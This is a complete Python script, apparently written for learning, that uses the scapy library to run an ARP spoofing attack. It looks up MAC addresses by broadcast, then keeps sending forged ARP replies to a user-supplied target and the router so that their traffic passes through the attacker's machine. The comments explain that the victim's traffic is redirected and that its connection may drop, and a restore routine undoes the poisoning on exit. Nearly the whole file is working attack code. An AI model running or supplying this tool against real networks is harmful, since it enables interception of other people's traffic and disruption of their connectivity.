#! /usr/bin/python

'''
We need to get mac address of router:
	1. Get mac_address of router.
	Create broadcast ether packet (ff:ff:ff:ff:ff:ff) 
	Create an ARP packet with dst ip of router
	Concat Ether and ARP packets 
		every machine on a local network will get it and if it knows the address, 
		it will respond back
 	Get src mac address from the answer of our broadcast packet. It is the mac of the router.
	2. Get mac address of target pc by ip. use the same broadcast packet, but target pc's dst ip instead of router's one
	3. Create a malware packet (ARP) of respone (op=2) even though we didn't get any request 
		with src mac of router and send to target pc. The pc will think it got the packet from router.
		And it will send all the packets back to us.
		And it will loose connection to Internet.
		And it will change its arp table (arp -a), it will assign router mac to attacker pc ip.
		So both router and attacker machine on target pc will have the same mac address!
'''

import scapy.all as scapy

def restore(destination_ip,source_ip):
	target_mac = get_target_mac(destination_ip) # target's mac
	source_mac = get_target_mac(source_ip) #router's mac
	packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
	scapy.send(packet, verbose=False)

def get_target_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	finalpacket = broadcast/arp_request # ARP packet in broadcast Ethernet packet
	answer = scapy.srp(finalpacket, timeout=2, verbose=False)[0] # select answer list
	try:
		mac = answer[0][1].hwsrc #select hardware source of the target
		return (mac)
	except IndexError:
		print("Error with parsing a packet to find mac address %s" % answer)


def spoof_arp(target_ip, spoofed_ip):
	'''Send arp packet with spoofed ip src
	e.g router will assign pc's mac to our ip
	pc will assign router's mac to our ip'''
	mac = get_target_mac(target_ip)
	packet = scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
	scapy.send(packet, verbose=False)


def main():
	target_ip = input("Enter target ip: ")
	spoofed_ip = input("Enter spoofed_ip (e.g. router's ip): ")

	try:
		while True:
			"""Spoof both target pc and router using their ip"""
			spoof_arp(target_ip, spoofed_ip)
			spoof_arp(spoofed_ip, target_ip)
	except KeyboardInterrupt:
		restore(target_ip, spoofed_ip)
		restore(spoofed_ip, target_ip)
		exit(0)


if __name__ == "__main__":
	main()

